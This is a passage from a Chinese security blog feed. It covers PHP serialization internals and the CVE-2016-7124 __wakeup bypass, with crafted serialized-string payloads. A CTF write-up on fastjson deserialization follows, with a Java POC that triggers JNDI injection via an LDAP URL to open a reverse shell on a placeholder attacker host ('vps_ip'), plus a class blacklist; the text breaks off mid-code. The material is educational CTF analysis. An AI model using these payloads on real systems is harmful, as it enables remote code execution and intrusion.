class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> IS_ARRAY: &#123;</span><br><span class="line">zend_bool incomplete_class = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (Z_TYPE_P(struc) == IS_ARRAY) &#123;</span><br><span class="line">smart_str_appendl(buf, <span class="string">&quot;a:&quot;</span>, <span class="number">2</span>);</span><br><span class="line">myht = HASH_OF(struc);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">incomplete_class = php_var_serialize_class_name(buf, struc TSRMLS_CC);</span><br><span class="line">myht = Z_OBJPROP_P(struc);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* count after serializing name, since php_var_serialize_class_name</span></span><br><span class="line"><span class="comment"> * changes the count if the variable is incomplete class */</span></span><br><span class="line">i = myht ? zend_hash_num_elements(myht) : <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; incomplete_class) &#123;</span><br><span class="line">--i;</span><br><span class="line">&#125;</span><br><span class="line">smart_str_append_long(buf, i);</span><br><span class="line">smart_str_appendl(buf, <span class="string">&quot;:&#123;&quot;</span>, <span class="number">2</span>);</span><br><span class="line"><span class="keyword">if</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="type">char</span> *key;</span><br><span class="line">zval **data;</span><br><span class="line">ulong index;</span><br><span class="line">uint key_len;</span><br><span class="line">HashPosition pos;</span><br><span class="line"></span><br><span class="line">zend_hash_internal_pointer_reset_ex(myht, &amp;pos);</span><br><span class="line"><span class="keyword">for</span> (;; zend_hash_move_forward_ex(myht, &amp;pos)) &#123;</span><br><span class="line">i = zend_hash_get_current_key_ex(myht, &amp;key, &amp;key_len, &amp;index, <span class="number">0</span>, &amp;pos);</span><br><span class="line"><span class="keyword">if</span> (i == HASH_KEY_NON_EXISTENT) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (incomplete_class &amp;&amp; <span class="built_in">strcmp</span>(key, MAGIC_MEMBER) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (i) &#123;</span><br><span class="line"><span class="keyword">case</span> HASH_KEY_IS_LONG:</span><br><span class="line">php_var_serialize_long(buf, index);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> HASH_KEY_IS_STRING:</span><br><span class="line">php_var_serialize_string(buf, key, key_len - <span class="number">1</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* we should still add element even if it&#x27;s not OK,</span></span><br><span class="line"><span class="comment"> * since we already wrote the length of the array before */</span></span><br><span class="line"><span class="keyword">if</span> (zend_hash_get_current_data_ex(myht, (<span class="type">void</span> **) &amp;data, &amp;pos) != SUCCESS</span><br><span class="line">|| !data</span><br><span class="line">|| data == &amp;struc</span><br><span class="line">|| (Z_TYPE_PP(data) == IS_ARRAY &amp;&amp; Z_ARRVAL_PP(data)-&gt;nApplyCount &gt; <span class="number">1</span>)</span><br><span class="line">) &#123;</span><br><span class="line">smart_str_appendl(buf, <span class="string">&quot;N;&quot;</span>, <span class="number">2</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (Z_TYPE_PP(data) == IS_ARRAY) &#123;</span><br><span class="line">Z_ARRVAL_PP(data)-&gt;nApplyCount++;</span><br><span class="line">&#125;</span><br><span class="line">php_var_serialize_intern(buf, *data, var_hash TSRMLS_CC);</span><br><span class="line"><span class="keyword">if</span> (Z_TYPE_PP(data) == IS_ARRAY) &#123;</span><br><span class="line">Z_ARRVAL_PP(data)-&gt;nApplyCount--;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">smart_str_appendc(buf, <span class="string">&#x27;&#125;&#x27;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">smart_str_appendl(buf, <span class="string">&quot;i:0;&quot;</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>接下来就是利用<code>php_var_serialize_intern</code>函数递归解析整个哈希数组的过程，从中分别提取出变量名和值进行格式解析并将解析完成的字符串拼接到buf结构中。最后当整个过程结束后，整个字符串讲完全存进柔性数组结构buf中。</p><h3 id="有-sleep的情况"><a href="#有-sleep的情况" class="headerlink" title="有__sleep的情况"></a>有<code>__sleep</code>的情况</h3><p>跟进<code>php_var_serialize_call_sleep</code>函数</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032310435.png"                      alt="image-20230322164744700"                ><figcaption>image-20230322164744700</figcaption></figure></p><p>我们这里继续跟进<code>call_user_function</code>，根据宏定义，它实际上是调用了<code>_call_user_function_ex</code>函数，在这里做了一些拷贝动作，故不做截图，流程接下来进入<code>zend_call_function</code>函数的调用。</p><p>函数<code>zend_call_function</code>中，实际情况下，在<code>__sleep</code>中需要做一些我们自己的事情，这里PHP将要做的操作压入PHP自己的<code>zend_vm</code>引擎堆栈中，稍后会进行一条条解析(就是解析相应的OPCODE)。</p><p>这里流程会命中此分支，我们跟进<code>zend_execute_ex</code>函数。</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032309632.png"                      alt="image-20230322164936378"                ><figcaption>image-20230322164936378</figcaption></figure></p><p>我们这里可以看到在<code>ZEND_VM</code>中，整体体处理流程为while(1)循环，不断解析ZEND_VM栈中的操作。上图红框中ZEND_VM引擎会利用<code>ZEND_FASTCALL</code>方式派发到到相应的处理函数。在处理完<code>_sleep</code>函数中的一系列操作之后，接下来用<code>php_var_serialize_class</code>函数来序列化类名，递归序列化其<code>_sleep</code>函数返回值中的结构。最终都把结果存在了buf结构中。至此序列化的整个流程完毕。</p><blockquote><p>小结</p><p>当没有魔法函数时，序列化类名–&gt;利用递归序列化剩下的结构</p><p>当存在魔法函数时，调用魔法函数<code>__sleep</code>–&gt;利用ZEND_VM引擎解析PHP操作—&gt;返回需要序列化结构的数组–&gt;序列化类名–&gt;利用递归序列化<code>__sleep</code>的返回值结构。</p></blockquote><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>php7中，加入了新特性，带过滤的反序列化，根据<code>allowed_calsses</code>的设置情况来过滤相应的php对象</p><p>以下为php5的源码</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">PHP_FUNCTION(unserialize)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> *buf = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">int</span> buf_len;</span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *p;</span><br><span class="line"><span class="type">php_unserialize_data_t</span> var_hash;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, <span class="string">&quot;s&quot;</span>, &amp;buf, &amp;buf_len) == FAILURE) &#123;</span><br><span class="line">RETURN_FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (buf_len == <span class="number">0</span>) &#123;</span><br><span class="line">RETURN_FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">p = (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>*) buf;</span><br><span class="line">PHP_VAR_UNSERIALIZE_INIT(var_hash);</span><br><span class="line"><span class="keyword">if</span> (!php_var_unserialize(&amp;return_value, &amp;p, p + buf_len, &amp;var_hash TSRMLS_CC)) &#123;</span><br><span class="line">PHP_VAR_UNSERIALIZE_DESTROY(var_hash);</span><br><span class="line">zval_dtor(return_value);</span><br><span class="line"><span class="keyword">if</span> (!EG(exception)) &#123;</span><br><span class="line">php_error_docref(<span class="literal">NULL</span> TSRMLS_CC, E_NOTICE, <span class="string">&quot;Error at offset %ld of %d bytes&quot;</span>, (<span class="type">long</span>)((<span class="type">char</span>*)p - buf), buf_len);</span><br><span class="line">&#125;</span><br><span class="line">RETURN_FALSE;</span><br><span class="line">&#125;</span><br><span class="line">PHP_VAR_UNSERIALIZE_DESTROY(var_hash);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>被过滤的对象会被转化成<code>__PHP_Incomplete_Class</code>对象不能被直接使用，但是这里对反序列化流程没有影响，这里不做详细探讨。我们跟进<code>php_var_unserialize</code>函数。</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032309216.png"                      alt="image-20230322170306309"                ><figcaption>image-20230322170306309</figcaption></figure></p><p>继续跟进<code>php_var_unserialize_internal</code>函数。</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032309695.png"                      alt="image-20230322170416302"                ><figcaption>image-20230322170416302</figcaption></figure></p><p>此函数内部主要操作流程为对字符串进行解析，然后跳转到相应的处理流程。上图中解析出第一个字母0，代表此次反序列化为一个对象。这里首先会解析出对象名字，并进行查表操作确定此对象确实存在</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032309718.png"                      alt="image-20230322170506357"                ><figcaption>image-20230322170506357</figcaption></figure></p><p>上述操作做完之后，我们这里根据对象名称new出了自己新的对象并进行了初始化，但是我们的反序列化操作还是没有完成，我们跟进<code>object_common2</code>函数。</p><p>在这里我们看到了对魔法函数的判断与检测，但是调用部分并不在此。我们继续跟进process_nested_data函数。</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032309287.png"                      alt="image-20230322170613770"                ><figcaption>image-20230322170613770</figcaption></figure></p><p>看来这个函数利用WHILE循环来嵌套解析剩余的部分了，·其中包含两个<code>php_var_unserialize_internal</code>函数，第一个会解析名称，第二个是解析名称所对应的值。<code>process_nested_data</code>函数运行完毕后，字符串解析完毕，反序列化操作主要内容已经完成，流程即将进入尾声了。</p><p>在序列化完成后，在<code>PHP_VAR_UNSERIALIZE_DESTROY</code>释放空间处出现了<code>__wakeup</code></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032309054.png"                      alt="image-20230322170811880"                ><figcaption>image-20230322170811880</figcaption></figure></p><p>还记得反序列化流程中当发现有<code>__wakeup</code>时对其进行的<code>VAR_WAKEUP_FLAG</code>标志么，在这里当遍历<code>bar_dtor_hash</code>数组遇到这个标志时，正式开启对<code>__wakeup</code>调用，后期的调用手法和前面所介绍的<code>__sleep</code>调用手法完全相同，这里不再做重复说明。至此，反序列化所有流程完毕。</p><blockquote><p>小结：</p><p>获取反序列化字符串–&gt;根据类型进行反序列化—&gt;查表找到对应的反序列化类–&gt;根据字符串判断元素个数–&gt;new出新实例–&gt;迭代解析化剩下的字符串–&gt;判断是否具有魔法函数__wakeup并标记—&gt;释放空间并判断是否具有具有标记—&gt;开启调用</p></blockquote><h2 id="0x02-漏洞解析"><a href="#0x02-漏洞解析" class="headerlink" title="0x02 漏洞解析"></a>0x02 漏洞解析</h2><p>漏洞CVE-2016-7124(绕过<code>__wakeup</code>)魔法函数</p><h3 id="触发手段"><a href="#触发手段" class="headerlink" title="触发手段"></a>触发手段</h3><p>字符串中代表元素个数的数值大于真实值</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:5:&quot;hello&quot;;&#125;&#x27;</span></span><br></pre></td></tr></table></figure></div><p>其他方式</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:2:&quot;a&quot;;s:5:&quot;hello&quot;;&#125;&#x27;</span></span><br><span class="line"><span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;d:1:&quot;a&quot;;s:5:&quot;hello&quot;;&#125;&#x27;</span></span><br><span class="line"><span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:6:&quot;hello&quot;;&#125;&#x27;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>只要在解析类中的元素出现错误时，都会触发此漏洞。但是更改类元素内部操作(如上图的修改字符串长度，类变量类型等)会导致类成员变量赋值失败。只有修改类成员的个数(比原有成员个数大)时，才能保证类成员赋值时成功的。</p></blockquote><p>低版本的处理过程现在看来也相对简略。但是整体谐逻辑并没有改变，我们这里直接跟进<code>php_var_unserialize</code>函数，此后相同逻辑不再进行重复说明，我们直接跟到差异处(object_common2函数)也就是处理类中成员变量的代码</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032309540.png"                      alt="image-20230322171924054"                ><figcaption>image-20230322171924054</figcaption></figure></p><p>在函数<code>object_common2</code>中，存在两个主要操作，<code>process_nested_data</code>迭代解析类中的数据和魔法函数<code>__wakeup</code>的调用，且当<code>process_nested_data</code>函数解析失败后，直接返回0值，后面的<code>__wakeup</code>函数将没有调用的机会。</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032309542.png"                      alt="image-20230322171947861"                ><figcaption>image-20230322171947861</figcaption></figure></p><p>当只修改类成员的个数时，while循环可以完成的进行一次，这使得我们类中成员变量能被完整的赋值。当修改成员变量内部时，<code>pap_var_unserialize</code>函数调用失败，紧接着会调用<code>zval_dtor</code> 和<code>FREE_ZVAL</code>函数释放当前key(变量)空间，导致类中的变量赋值失败。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[aliyun CTF] ezbean分析与思考</title>
      <link href="/2023/05/05/ezbean%E5%88%86%E6%9E%90%E4%B8%8E%E6%80%9D%E8%80%83/"/>
      <url>/2023/05/05/ezbean%E5%88%86%E6%9E%90%E4%B8%8E%E6%80%9D%E8%80%83/</url>
      
        <content type="html"><![CDATA[<h1 id="aliyun-CTF-ezbean分析与思考"><a href="#aliyun-CTF-ezbean分析与思考" class="headerlink" title="aliyun CTF ezbean分析与思考"></a>aliyun CTF ezbean分析与思考</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>复现阿里云的时候发现了一个很奇怪、很玄学的点，官方和冠军wp都是一笔带过了，官方也没给exp，就试着自己硬调，调着调着有点上头，应该没人发过吧，我猜的😂</p><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>FastJson反序列化中有常见的链，BadAttributeValueExpException触发的JSON#toString-》getter方法，这个过程有点复杂，也不是本文的重点，具体可以参考</p><p><a class="link"   href="https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" >fastjson和原生反序列化 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="0x01-题目背景"><a href="#0x01-题目背景" class="headerlink" title="0x01 题目背景"></a>0x01 题目背景</h2><h3 id="反序列化点"><a href="#反序列化点" class="headerlink" title="反序列化点"></a>反序列化点</h3><p>题目给出了一个可以反序列化参数data传入数据的路由read</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050236105.png"                      alt="image-20230504230327231"                ><figcaption>image-20230504230327231</figcaption></figure></p><blockquote><p>这里的<code>MyObjectInputStream</code>继承自<code>ObjectInputStream</code>,调用readObject方会先进入resolveClass具体调用栈如下</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050236187.png"                      alt="image-20230504233800680"                ><figcaption>image-20230504233800680</figcaption></figure></p></blockquote><p>跟进resolveClass</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class <span class="title function_">resolveClass</span><span class="params">(ObjectStreamClass cls)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">   <span class="keyword">if</span>(!contains(cls.getName())) &#123;<span class="comment">//*</span></span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(cls);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;Unexpected serialized class&quot;</span>, cls.getName());</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>跟进<code>com.ctf.ezser.utils.MyObjectInputStream#contains</code>方法，是一个黑名单过滤</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] blacklist = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;</span><br><span class="line">           <span class="string">&quot;java\\.security.*&quot;</span>, <span class="string">&quot;java\\.rmi.*&quot;</span>,  <span class="string">&quot;com\\.fasterxml.*&quot;</span>, <span class="string">&quot;com\\.ctf\\.*&quot;</span>,</span><br><span class="line">           <span class="string">&quot;org\\.springframework.*&quot;</span>, <span class="string">&quot;org\\.yaml.*&quot;</span>, <span class="string">&quot;javax\\.management\\.remote.*&quot;</span></span><br><span class="line">   &#125;;</span><br><span class="line"><span class="comment">//...  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">contains</span><span class="params">(String targetValue)</span> &#123;</span><br><span class="line">      <span class="keyword">for</span> (String forbiddenPackage : blacklist) &#123;</span><br><span class="line">         <span class="keyword">if</span> (targetValue.matches(forbiddenPackage))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>不过经实测这个黑名单似乎起不到过滤的作用</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050236143.png"                      alt="image-20230504234209559"                ><figcaption>image-20230504234209559</figcaption></figure></p></blockquote><h2 id="0x02-问题发现"><a href="#0x02-问题发现" class="headerlink" title="0x02 问题发现"></a>0x02 问题发现</h2><h3 id="限制分析"><a href="#限制分析" class="headerlink" title="限制分析"></a>限制分析</h3><p>fastjson&#x3D;&#x3D;1.2.60&gt;1.2.49</p><p><code>SecureObjectInputStream</code>类当中重写了<code>resolveClass</code>,在其中调用了<code>checkAutoType</code>方法做类的检查</p><p>这里提一下fastjson中的反序列化机制，由于ObjectInputStream的不安全性，fastjson在调用<code>JSONArray/JSONObject</code>的readObject方法触发反序列化时，会将反序列化过程委托给<code>SecureObjectInputStream</code>处理，这个类可以理解成是安全的<code>ObjectInputStream</code>，下图为委托起点(<code>ObjectInputStream#defaultReadObject</code>)</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050236065.png"                      alt="image-20230504235432194"                ><figcaption>image-20230504235432194</figcaption></figure></p><p>之后的过程感兴趣可以调一下看下调用栈，几个节点如下（太多了，只选了其中几个）</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream #defaultReadObject</span><br><span class="line">ObjectInputStream #ReadObject</span><br><span class="line">ObjectInputStream #ReadObject0</span><br><span class="line">ObjectInputStream #readNonProxyDesc</span><br><span class="line">SecureObjectInputStream #resolveClass</span><br></pre></td></tr></table></figure></div><p>关注一下resolveClass</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc)</span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> desc.getName();</span><br><span class="line">    <span class="keyword">if</span> (name.length() &gt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> name.lastIndexOf(<span class="string">&#x27;[&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (index != -<span class="number">1</span>) &#123;</span><br><span class="line">            name = name.substring(index + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (name.length() &gt; <span class="number">2</span> &amp;&amp; name.charAt(<span class="number">0</span>) == <span class="string">&#x27;L&#x27;</span> &amp;&amp; name.charAt(name.length() - <span class="number">1</span>) == <span class="string">&#x27;;&#x27;</span>) &#123;</span><br><span class="line">            name = name.substring(<span class="number">1</span>, name.length() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ParserConfig.global.checkAutoType(name, <span class="literal">null</span>, Feature.SupportAutoType.mask);<span class="comment">//重点，调用了checkAutoType方法</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>反序列化失败的大多数原因都是checkAutoType函数执行过程中抛出了JSONException异常</p></blockquote><p>这个异常大概字符串是</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">default</span> constructor not found. <span class="keyword">class</span> <span class="title class_">xxxxx</span></span><br></pre></td></tr></table></figure></div><p>这样的话之前的链子就打不通了，原来有Fastjson反序列化的链子思路是从<code>BadAttributeValueExpException</code>-&gt;<code>JSON#toString</code>-&gt;<code>JSON#toJSONString</code>，进而最后能触发任意类的getter(就是类的方法名以get开头的)，回看这题给的MyBean，里面有个<code>getConnect</code></p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">getConnect</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">     <span class="built_in">this</span>.conn.connect();</span><br><span class="line">     <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (IOException var2) &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="string">&quot;fail&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//   private JMXConnector conn;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>只要我们能触发getConnect，将conn设置为RMIConnector，可以触发JNDI注入，之后也就能反弹shell了</p></blockquote><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jmxurl</span> <span class="operator">=</span> <span class="string">&quot;service:jmx:rmi:///jndi/ldap://vps_ip:1389/Basic/ReverseShell/vps_ip/3344&quot;</span>;</span><br><span class="line"><span class="type">JMXServiceURL</span> <span class="variable">jmxServiceURL</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(jmxurl);</span><br><span class="line"><span class="type">RMIConnector</span> <span class="variable">rmi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnector</span>(jmxServiceURL, <span class="literal">null</span>);</span><br><span class="line">com.ctf.ezser.bean.<span class="type">MyBean</span> <span class="variable">mb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">com</span>.ctf.ezser.bean.MyBean(jmxurl,<span class="string">&quot;sssaaaa&quot;</span>,rmi);</span><br><span class="line"></span><br><span class="line">com.alibaba.fastjson.<span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">com</span>.alibaba.fastjson.JSONArray();</span><br><span class="line">jsonArray.add(mb);</span><br><span class="line"></span><br><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">val</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">valfield</span> <span class="operator">=</span> val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">valfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">valfield.set(val, jsonArray);</span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">oos.writeObject(val);</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">System.out.println(ret);</span><br></pre></td></tr></table></figure></div><h3 id="玄学事件"><a href="#玄学事件" class="headerlink" title="玄学事件"></a>玄学事件</h3><p>按理来说，根据上述链子构造的反序列化应该会被SecureObjectInputStream拦截，进而执行<code>checkAutoType</code>然后抛出JSONException异常，导致反序列化失败，但神奇的是前两次反序列化一定失败，而从第三次开始就能成功并反弹shell。并且官方wp也用的这条链子，但写得过于简短，看冠军队的wp说是fj的随机构造函数问题，后来调了一下感觉可能不是这个原因</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202305050237675.png"                      alt="image-20230505012846237"                ><figcaption>image-20230505012846237</figcaption></figure></p><p>一开始以为三次只是巧合，后来每次验证都是三次。并且第一次是<code>default constructor not found. class xxx.RMIConnector</code>第二次是<code>default constructor not found. class xxx.JMXServiceURL</code></p><p>这里先提一下checkAutoType通过typeName找类的三种方式</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">    clazz = TypeUtils.getClassFromMapping(typeName);<span class="comment">//🌟</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (clazz == <span class="literal">null</span>) 